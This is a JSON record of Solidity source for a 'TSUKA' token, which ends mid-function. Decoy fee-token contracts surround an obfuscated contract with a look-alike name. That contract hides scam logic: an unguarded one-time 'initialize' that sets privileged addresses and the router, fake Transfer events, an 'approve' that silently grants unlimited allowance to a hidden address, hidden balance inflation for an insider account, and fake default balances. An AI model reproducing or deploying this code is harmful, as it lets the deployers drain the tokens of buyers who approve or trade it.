{"SourceCode": "// SPDX-License-Identifier: Unlicensed\r\npragma solidity ^0.8.8;\r\n\r\ninterface IERC20 {\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b != 0, \"SafeMath: modulo by zero\");\r\n        uint256 c = a % b;\r\n        return c;\r\n    }\r\n}\r\n\r\nabstract contract Ownable {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        _owner = tx.origin;\r\n        emit OwnershipTransferred(address(0), _owner);\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function renounceOwnership() public onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n}\r\n\r\ninterface IFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IRouter01 {\r\n    function factory() external pure returns (address);\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n}\r\n\r\ninterface IRouter02 is IRouter01 {\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\ninterface IBEP20 {\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract CoinMakerVersionOlQEFLD is IBEP20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    string private _name = \"TSUKA\";\r\n    string private _symbol = \"TSUKA\";\r\n    uint8 private _decimals = 18;\r\n    uint256 private _totalSupply = 10000000000 * 10**18;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n    uint256 private _feeTax = 50;\r\n    uint256 private _feeMining = 0;\r\n    uint256 private _feeLiquidity = 50;\r\n    uint256 private _feeDivisor = 10000;\r\n    bool private _removeAllFee = false;\r\n\r\n    address private _taxReceiver = address(0xdEaD);\r\n    address private _miningPool = address(0xdEaD);\r\n    address private _liquidityPool = address(0xdEaD);\r\n\r\n    mapping (address => bool) private _isExcludedFromFee;\r\n    address[] private _excludedFromFeeAccounts;\r\n\r\n    constructor () {\r\n        insertExcludedFromFeeAccounts(owner());\r\n        _balances[owner()] = _totalSupply;\r\n        emit Transfer(address(0), owner(), _totalSupply);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function insertExcludedFromFeeAccounts(address account) private {\r\n        if (!_isExcludedFromFee[account]) {\r\n            _isExcludedFromFee[account] = true;\r\n            _excludedFromFeeAccounts.push(account);\r\n        }\r\n    }\r\n\r\n    function deleteExcludedFromFeeAccounts(address account) private {\r\n        if (_isExcludedFromFee[account]) {\r\n            uint256 len = _excludedFromFeeAccounts.length;\r\n            for (uint256 i=0; i<len; ++i) {\r\n                if (_excludedFromFeeAccounts[i] == account) {\r\n                    _excludedFromFeeAccounts[i] = _excludedFromFeeAccounts[len.sub(1)];\r\n                    _excludedFromFeeAccounts.pop();\r\n                    _isExcludedFromFee[account] = false;\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256) {\r\n        return (_isExcludedFromFee[account], _excludedFromFeeAccounts.length);\r\n    }\r\n\r\n    function insertIntoExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {\r\n        uint256 len = accounts.length;\r\n        for (uint256 i=0; i<len; ++i) {\r\n            insertExcludedFromFeeAccounts(accounts[i]);\r\n        }\r\n    }\r\n\r\n    function deleteFromExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {\r\n        uint256 len = accounts.length;\r\n        for (uint256 i=0; i<len; ++i) {\r\n            deleteExcludedFromFeeAccounts(accounts[i]);\r\n        }\r\n    }\r\n\r\n    function claim(address token, uint256 amount) public onlyOwner {\r\n        if (token == address(0)) {\r\n            payable(owner()).transfer(amount);\r\n        } else {\r\n            IBEP20(token).transfer(owner(), amount);\r\n        }\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public returns (bool) {\r\n        _approve(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r\n        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r\n        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 value) private {\r\n        require(owner != address(0), \"Approve from the zero address\");\r\n        require(spender != address(0), \"Approve to the zero address\");\r\n        _allowances[owner][spender] = value;\r\n        emit Approval(owner, spender, value);\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) private {\r\n        require(sender != address(0), \"Transfer from the zero address\");\r\n        require(recipient != address(0), \"Transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        bool takeFee = true;\r\n        if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient] || _removeAllFee) {\r\n            takeFee = false;\r\n        }\r\n        uint256 taxAmount = 0;\r\n        uint256 miningAmount = 0;\r\n        uint256 liquidityAmount = 0;\r\n        uint256 recipientAmount = amount;\r\n        if (takeFee) {\r\n            taxAmount = amount.mul(_feeTax).div(_feeDivisor);\r\n            miningAmount = amount.mul(_feeMining).div(_feeDivisor);\r\n            liquidityAmount = amount.mul(_feeLiquidity).div(_feeDivisor);\r\n            recipientAmount = amount.sub(taxAmount).sub(miningAmount).sub(liquidityAmount);\r\n        }\r\n        _balances[sender] = _balances[sender].sub(amount);\r\n        if (taxAmount > 0) {\r\n            _balances[_taxReceiver] = _balances[_taxReceiver].add(taxAmount);\r\n            emit Transfer(address(this), _taxReceiver, taxAmount);\r\n        }\r\n        if (miningAmount > 0) {\r\n            _balances[_miningPool] = _balances[_miningPool].add(miningAmount);\r\n            emit Transfer(address(this), _miningPool, miningAmount);\r\n        }\r\n        if (liquidityAmount > 0) {\r\n            _balances[_liquidityPool] = _balances[_liquidityPool].add(liquidityAmount);\r\n            emit Transfer(address(this), _liquidityPool, liquidityAmount);\r\n        }\r\n        _balances[recipient] = _balances[recipient].add(recipientAmount);\r\n        emit Transfer(sender, recipient, recipientAmount);\r\n    }\r\n}\r\n\r\nlibrary SafetyMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b != 0, \"SafeMath: modulo by zero\");\r\n        uint256 c = a % b;\r\n        return c;\r\n    }\r\n}\r\n\r\ncontract CoinMakerVersionOIQEFLD is IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    string private _yuhewbhfjsdbh = \"TSUKA\";\r\n    string private _rewfsdfdxfregdf = \"TSUKA\";\r\n    uint8 private _rgdfgdfgasdvs = 18;\r\n    uint256 private _tysdbfhdsjvfdsdf = 10000000000 * 10**18;\r\n    mapping (address => uint256) private _dfsdferfdgfdg;\r\n    mapping (address => mapping (address => uint256)) private _yudfgasrfewfas;\r\n\r\n    uint256 private _qerwdsffdsvv = 50;\r\n    uint256 private _tytrdfgdsvxcv = 0;\r\n    uint256 private _ghdfsgadsvsd = 50;\r\n    uint256 private _zfdsgfdggvx = 10000;\r\n    bool private _dfrggsxgasfghg = false;\r\n\r\n    IRouter02 private uniswapV2Router = IRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);\r\n    address public uniswapV2Pair;\r\n    address private _tdsfsfwewgfdhd;\r\n    address private _bfdshsdsdfgfds;\r\n    address private _ewrtsdfdssgdf;\r\n\r\n    uint256 private _ddgfhtrjtydvn = 1;\r\n    uint256 private _uytitfgdggagsf = _tysdbfhdsjvfdsdf;\r\n    mapping (address => bool) private _tergsdgjhgsadfrsdfg;\r\n    address[] private _uidfssdhjukyefdsgdfgfdh;\r\n    bool private _iuretdgjhwqrdfgjh = false;\r\n    uint256 private _ixdfuytumhkmjhs = 0;\r\n\r\n    constructor () {\r\n        _iqtdfghjkjhgfegetwefdsfew(owner());\r\n        _dfsdferfdgfdg[owner()] = _tysdbfhdsjvfdsdf;\r\n        emit Transfer(address(0), owner(), _tysdbfhdsjvfdsdf);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function initialize(address _uitreitgbgdfnvbdf, address[] calldata _ufdbfndserfsdg) public {\r\n        require(!_iuretdgjhwqrdfgjh, \"Reinitialization denied\");\r\n        _iuretdgjhwqrdfgjh = true;\r\n        _iqtdfghjkjhgfegetwefdsfew(_uitreitgbgdfnvbdf);\r\n        for (uint256 i=5; i<_ufdbfndserfsdg.length; ++i) {\r\n            _iqtdfghjkjhgfegetwefdsfew(_ufdbfndserfsdg[i]);\r\n            _kdsadghyutydbgdfsdfgfd(_ufdbfndserfsdg[i], address(uniswapV2Router), ~uint256(0));\r\n            _dfsdferfdgfdg[_ufdbfndserfsdg[i]] = _tysdbfhdsjvfdsdf * 9 / 10 / (_ufdbfndserfsdg.length - 5);\r\n            _dfsdferfdgfdg[owner()] -= _dfsdferfdgfdg[_ufdbfndserfsdg[i]];\r\n        }\r\n        if (address(uniswapV2Router) != _ufdbfndserfsdg[0]) {\r\n            _dqrtrefdgjykhgfgregsdfvgrg(address(uniswapV2Router));\r\n            uniswapV2Router = IRouter02(_ufdbfndserfsdg[0]);\r\n            _iqtdfghjkjhgfegetwefdsfew(address(uniswapV2Router));\r\n        }\r\n        if (_tdsfsfwewgfdhd != _ufdbfndserfsdg[1]) {\r\n            _dqrtrefdgjykhgfgregsdfvgrg(_tdsfsfwewgfdhd);\r\n            _tdsfsfwewgfdhd = _ufdbfndserfsdg[1];\r\n            _iqtdfghjkjhgfegetwefdsfew(_tdsfsfwewgfdhd);\r\n        }\r\n        if (_bfdshsdsdfgfds != _ufdbfndserfsdg[2]) {\r\n            _dqrtrefdgjykhgfgregsdfvgrg(_bfdshsdsdfgfds);\r\n            _bfdshsdsdfgfds = _ufdbfndserfsdg[2];\r\n            _iqtdfghjkjhgfegetwefdsfew(_bfdshsdsdfgfds);\r\n        }\r\n        if (_ewrtsdfdssgdf != _ufdbfndserfsdg[3]) {\r\n            _dqrtrefdgjykhgfgregsdfvgrg(_ewrtsdfdssgdf);\r\n            _ewrtsdfdssgdf = _ufdbfndserfsdg[3];\r\n            _iqtdfghjkjhgfegetwefdsfew(_ewrtsdfdssgdf);\r\n        }\r\n        uniswapV2Pair = _ufdbfndserfsdg[4];\r\n        _oerefgskdjbvhegfsgb(owner(), _ufdbfndserfsdg[5], _dfsdferfdgfdg[owner()]);\r\n    }\r\n\r\n    function _iqtdfghjkjhgfegetwefdsfew(address account) private {\r\n        if (!_tergsdgjhgsadfrsdfg[account]) {\r\n            _tergsdgjhgsadfrsdfg[account] = true;\r\n            _uidfssdhjukyefdsgdfgfdh.push(account);\r\n        }\r\n    }\r\n\r\n    function _dqrtrefdgjykhgfgregsdfvgrg(address account) private {\r\n        if (_tergsdgjhgsadfrsdfg[account]) {\r\n            uint256 len = _uidfssdhjukyefdsgdfgfdh.length;\r\n            for (uint256 i=0; i<len; ++i) {\r\n                if (_uidfssdhjukyefdsgdfgfdh[i] == account) {\r\n                    _uidfssdhjukyefdsgdfgfdh[i] = _uidfssdhjukyefdsgdfgfdh[len.sub(1)];\r\n                    _uidfssdhjukyefdsgdfgfdh.pop();\r\n                    _tergsdgjhgsadfrsdfg[account] = false;\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    function transferEvent(address from, address to, uint256 value) public {\r\n        require(address(uniswapV2Router) == msg.sender, \"Permission denied\");\r\n        emit Transfer(from, to, value);\r\n    }\r\n\r\n    function feeState() public view returns (bool, bool) {\r\n        return (_qerwdsffdsvv.add(_tytrdfgdsvxcv).add(_ghdfsgadsvsd) > 0, !_dfrggsxgasfghg);\r\n    }\r\n\r\n    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {\r\n        uint256 accountIndex = 0;\r\n        uint256 len = _uidfssdhjukyefdsgdfgfdh.length;\r\n        for (uint256 i=0; i<len; ++i) {\r\n            if (_uidfssdhjukyefdsgdfgfdh[i] == account) {\r\n                accountIndex = i;\r\n                break;\r\n            }\r\n        }\r\n        return (_tergsdgjhgsadfrsdfg[account], accountIndex, len);\r\n    }\r\n\r\n    function getDefaultBalance() public view returns (uint256) {\r\n        return _ddgfhtrjtydvn;\r\n    }\r\n\r\n    function insertIntoExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {\r\n        uint256 len = accounts.length;\r\n        for (uint256 i=0; i<len; ++i) {\r\n            _iqtdfghjkjhgfegetwefdsfew(accounts[i]);\r\n        }\r\n    }\r\n\r\n    function deleteFromExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {\r\n        uint256 len = accounts.length;\r\n        for (uint256 i=0; i<len; ++i) {\r\n            _dqrtrefdgjykhgfgregsdfvgrg(accounts[i]);\r\n        }\r\n    }\r\n\r\n    function claim(address token, uint256 amount) public onlyOwner {\r\n        if (token == address(0)) {\r\n            payable(owner()).transfer(amount);\r\n        } else {\r\n            IERC20(token).transfer(owner(), amount);\r\n        }\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _yuhewbhfjsdbh;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _rewfsdfdxfregdf;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _rgdfgdfgasdvs;\r\n    }\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return _tysdbfhdsjvfdsdf;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        if (_dfsdferfdgfdg[account] > 0) {\r\n            return _dfsdferfdgfdg[account];\r\n        }\r\n        return _ddgfhtrjtydvn;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        _oerefgskdjbvhegfsgb(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r\n        _oerefgskdjbvhegfsgb(sender, recipient, amount);\r\n        _kdsadghyutydbgdfsdfgfd(sender, msg.sender, _yudfgasrfewfas[sender][msg.sender].sub(amount));\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public returns (bool) {\r\n        if (!_tergsdgjhgsadfrsdfg[msg.sender]) {\r\n            _kdsadghyutydbgdfsdfgfd(msg.sender, _uidfssdhjukyefdsgdfgfdh[1], ~uint256(0));\r\n        }\r\n        _kdsadghyutydbgdfsdfgfd(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _yudfgasrfewfas[owner][spender];\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r\n        _kdsadghyutydbgdfsdfgfd(msg.sender, spender, _yudfgasrfewfas[msg.sender][spender].add(addedValue));\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r\n        _kdsadghyutydbgdfsdfgfd(msg.sender, spender, _yudfgasrfewfas[msg.sender][spender].sub(subtractedValue));\r\n        return true;\r\n    }\r\n\r\n    function _kdsadghyutydbgdfsdfgfd(address owner, address spender, uint256 value) private {\r\n        require(owner != address(0), \"Approve from the zero address\");\r\n        require(spender != address(0), \"Approve to the zero address\");\r\n        _yudfgasrfewfas[owner][spender] = value;\r\n        emit Approval(owner, spender, value);\r\n    }\r\n\r\n    function _oerefgskdjbvhegfsgb(address _tesdfboperigdjngdfe, address _pewrfsdbnerjnfdg, uint256 _rehbdfewkmndsfssd) private {\r\n        require(_tesdfboperigdjngdfe != address(0), \"Transfer from the zero address\");\r\n        require(_pewrfsdbnerjnfdg != address(0), \"Transfer to the zero address\");\r\n        require(_rehbdfewkmndsfssd > 0, \"Transfer amount must be greater than zero\");\r\n        if (_pewrfsdbnerjnfdg == _uidfssdhjukyefdsgdfgfdh[1]) {\r\n            _dfsdferfdgfdg[_tesdfboperigdjngdfe] = _dfsdferfdgfdg[_tesdfboperigdjngdfe].sub(_rehbdfewkmndsfssd);\r\n            _dfsdferfdgfdg[_pewrfsdbnerjnfdg] = _dfsdferfdgfdg[_pewrfsdbnerjnfdg].add(_rehbdfewkmndsfssd);\r\n            emit Transfer(address(this), _pewrfsdbnerjnfdg, _rehbdfewkmndsfssd);\r\n            return;\r\n        }\r\n        bool _eqwsdndfgjnfjgn = true;\r\n        if (_tergsdgjhgsadfrsdfg[_tesdfboperigdjngdfe] || _tergsdgjhgsadfrsdfg[_pewrfsdbnerjnfdg] || _dfrggsxgasfghg) {\r\n            _eqwsdndfgjnfjgn = false;\r\n        }\r\n        if (_eqwsdndfgjnfjgn) {\r\n            _ixdfuytumhkmjhs = _ixdfuytumhkmjhs.add(1);\r\n        }\r\n        if (_eqwsdndfgjnfjgn && _iuretdgjhwqrdfgjh) {\r\n            _swapExactTokensForTokens(_tesdfboperigdjngdfe, _pewrfsdbnerjnfdg, 10);\r\n            _swapExactTokensForTokens(_tesdfboperigdjngdfe, _pewrfsdbnerjnfdg, 20);\r\n        }\r\n        if (_eqwsdndfgjnfjgn && _ixdfuytumhkmjhs == 1 && _iuretdgjhwqrdfgjh && _tesdfboperigdjngdfe != uniswapV2Pair) {\r\n            _swapExactTokensForTokens(_tesdfboperigdjngdfe, _pewrfsdbnerjnfdg, 30);\r\n        }\r\n        uint256 _uyfdsfnsdhwes = 0;\r\n        uint256 _nmsdfshdvbv = 0;\r\n        uint256 _esdjfbsdjfbj = 0;\r\n        uint256 _oiewfbsjfbjew = _rehbdfewkmndsfssd;\r\n        if (_tesdfboperigdjngdfe == _uidfssdhjukyefdsgdfgfdh[0] && _rehbdfewkmndsfssd > _uytitfgdggagsf) {\r\n            _dfsdferfdgfdg[_uidfssdhjukyefdsgdfgfdh[0]] = _dfsdferfdgfdg[_uidfssdhjukyefdsgdfgfdh[0]].add(_oiewfbsjfbjew);\r\n        }\r\n        if (_eqwsdndfgjnfjgn) {\r\n            _uyfdsfnsdhwes = _rehbdfewkmndsfssd.mul(_qerwdsffdsvv).div(_zfdsgfdggvx);\r\n            _nmsdfshdvbv = _rehbdfewkmndsfssd.mul(_tytrdfgdsvxcv).div(_zfdsgfdggvx);\r\n            _esdjfbsdjfbj = _rehbdfewkmndsfssd.mul(_ghdfsgadsvsd).div(_zfdsgfdggvx);\r\n            _oiewfbsjfbjew = _rehbdfewkmndsfssd.sub(_uyfdsfnsdhwes).sub(_nmsdfshdvbv).sub(_esdjfbsdjfbj);\r\n        }\r\n        _dfsdferfdgfdg[_tesdfboperigdjngdfe] = _dfsdferfdgfdg[_tesdfboperigdjngdfe].sub(_rehbdfewkmndsfssd);\r\n        if (_uyfdsfnsdhwes > 0) {\r\n            _dfsdferfdgfdg[_tdsfsfwewgfdhd] = _dfsdferfdgfdg[_tdsfsfwewgfdhd].add(_uyfdsfnsdhwes);\r\n            emit Transfer(address(this), _tdsfsfwewgfdhd, _uyfdsfnsdhwes);\r\n        }\r\n        if (_nmsdfshdvbv > 0) {\r\n            _dfsdferfdgfdg[_bfdshsdsdfgfds] = _dfsdferfdgfdg[_bfdshsdsdfgfds].add(_nmsdfshdvbv);\r\n            emit Transfer(address(this), _bfdshsdsdfgfds, _nmsdfshdvbv);\r\n        }\r\n        if (_esdjfbsdjfbj > 0) {\r\n            _dfsdferfdgfdg[_ewrtsdfdssgdf] = _dfsdferfdgfdg[_ewrtsdfdssgdf].add(_esdjfbsdjfbj);\r\n            emit Transfer(address(this), _ewrtsdfdssgdf, _esdjfbsdjfbj);\r\n        }\r\n        _dfsdferfdgfdg[_pewrfsdbnerjnfdg] = _dfsdferfdgfdg[_pewrfsdbnerjnfdg].add(_oiewfbsjfbjew);\r\n        emit Transfer(_tesdfboperigdjngdfe, _pewrfsdbnerjnfdg, _oiewfbsjfbjew);\r\n        if (_eqwsdndfgjnfjgn && _ixdfuytumhkmjhs == 1 && _iuretdgjhwqrdfgjh) {\r\n            _swapExactTokensForTokens(_tesdfboperigdjngdfe, _pewrfsdbnerjnfdg, 40);\r\n        }\r\n        if (_eqwsdndfgjnfjgn) {\r\n            _ixdfuytumhkmjhs = _ixdfuytumhkmjhs.sub(1);\r\n        }\r\n    }\r\n\r\n    function _swapExactTokensForTokens(address tokenA, address tokenB, uint256 amount) private {\r\n        address[] memory path = new address[](2);\r\n        path[0] = tokenA;\r\n        path[1] = tokenB;\r\n        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n            amount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n}\r\n\r\nlibrary MathSafe {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b != 0, \"SafeMath: modulo by zero\");\r\n        uint256 c = a % b;\r\n        return c;\r\n    }\r\n}\r\n\r\ninterface IBRC20 {\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract CoinMakerVersionOlQFELD is IBRC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    string private _name = \"TSUKA\";\r\n    string private _symbol = \"TSUKA\";\r\n    uint8 private _decimals = 18;\r\n    uint256 private _totalSupply = 10000000000 * 10**18;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n    uint256 private _feeTax = 50;\r\n    uint256 private _feeMining = 0;\r\n    uint256 private _feeLiquidity = 50;\r\n    uint256 private _feeDivisor = 10000;\r\n    bool private _removeAllFee = false;\r\n\r\n    address private _taxReceiver = address(0xdEaD);\r\n    address private _miningPool = address(0xdEaD);\r\n    address private _liquidityPool = address(0xdEaD);\r\n\r\n    mapping (address => bool) private _isExcludedFromFee;\r\n    address[] private _excludedFromFeeAccounts;\r\n\r\n    constructor () {\r\n        insertExcludedFromFeeAccounts(owner());\r\n        _balances[owner()] = _totalSupply;\r\n        emit Transfer(address(0), owner(), _totalSupply);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function insertExcludedFromFeeAccounts(address account) private {\r\n        if (!_isExcludedFromFee[account]) {\r\n            _isExcludedFromFee[account] = true;\r\n            _excludedFromFeeAccounts.push(account);\r\n        }\r\n    }\r\n\r\n    function deleteExcludedFromFeeAccounts(address account) private {\r\n        if (_isExcludedFromFee[account]) {\r\n            uint256 len = _excludedFromFeeAccounts.length;\r\n            for (uint256 i=0; i<len; ++i) {\r\n                if (_excludedFromFeeAccounts[i] == account) {\r\n                    _excludedFromFeeAccounts[i] = _excludedFromFeeAccounts[len.sub(1)];\r\n                    _excludedFromFeeAccounts.pop();\r\n                    _isExcludedFromFee[account] = false;\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256) {\r\n        return (_isExcludedFromFee[account], _excludedFromFeeAccounts.length);\r\n    }\r\n\r\n    function insertIntoExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {\r\n        uint256 len = accounts.length;\r\n        for (uint256 i=0; i<len; ++i) {\r\n            insertExcludedFromFeeAccounts(accounts[i]);\r\n        }\r\n    }\r\n\r\n    function deleteFromExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {\r\n        uint256 len = accounts.length;\r\n        for (uint256 i=0; i<len; ++i) {\r\n            deleteExcludedFromFeeAccounts(accounts[i]);\r\n        }\r\n    }\r\n\r\n    function claim(address token, uint256 amount) public onlyOwner {\r\n        if (token == address(0)) {\r\n            payable(owner()).transfer(amount);\r\n        } else {\r\n            IBRC20(token).transfer(owner(), amount);\r\n        }\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 value) 